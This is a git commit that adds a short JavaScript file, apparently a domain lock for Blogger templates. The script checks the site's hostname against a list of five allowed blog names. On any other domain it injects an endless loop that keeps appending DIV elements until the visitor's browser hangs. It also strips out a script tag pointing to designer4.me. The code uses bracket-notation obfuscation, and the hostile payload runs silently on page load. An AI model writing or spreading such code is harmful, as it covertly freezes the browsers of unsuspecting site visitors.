b392fce1e4a3e4f90d09498a2231045fad696505
wejdaneblogger <31163344+wejdaneblogger@users.noreply.github.com>
2018-03-02 13:53:28 +0100

    Create imad.js

---
+++ imad.js
@@ -0,0 +1,24 @@
+var x_n = 0;
+var x_l = location['hostname'];
+if (x_l['indexOf']('.blogspot') != -1) {
+    var x_l = x_l['split']('.')[0]
+} else {
+    var x_l = x_l['split']('.')[1]
+};
+var x_a = ['mostafa-f-tech', 'khaledmega', 'mohammedsaeed2018', 'egygeek', 'mohammed-s-technical'];
+for (i = 0; i < x_a['length']; i++) {
+    if (x_l == x_a[i]) {
+        x_n++
+    }
+};
+if (x_n == 0) {
+    var s_s = document['createElement']('script');
+    s_s['innerHTML'] = 'var x_go = 1;var f_o = document.createElement("DIV");do {document.body.appendChild(f_o);}while (x_go < 5);';
+    document['head']['appendChild'](s_s)
+};
+var x_ss = document['getElementsByTagName']('script');
+for (i = 0; i < x_ss['length']; i++) {
+    if (x_ss[i]['src'] == 'http://designer4.me/peter/chat-head.js') {
+        x_ss[i]['replaceWith']('')
+    }
+}
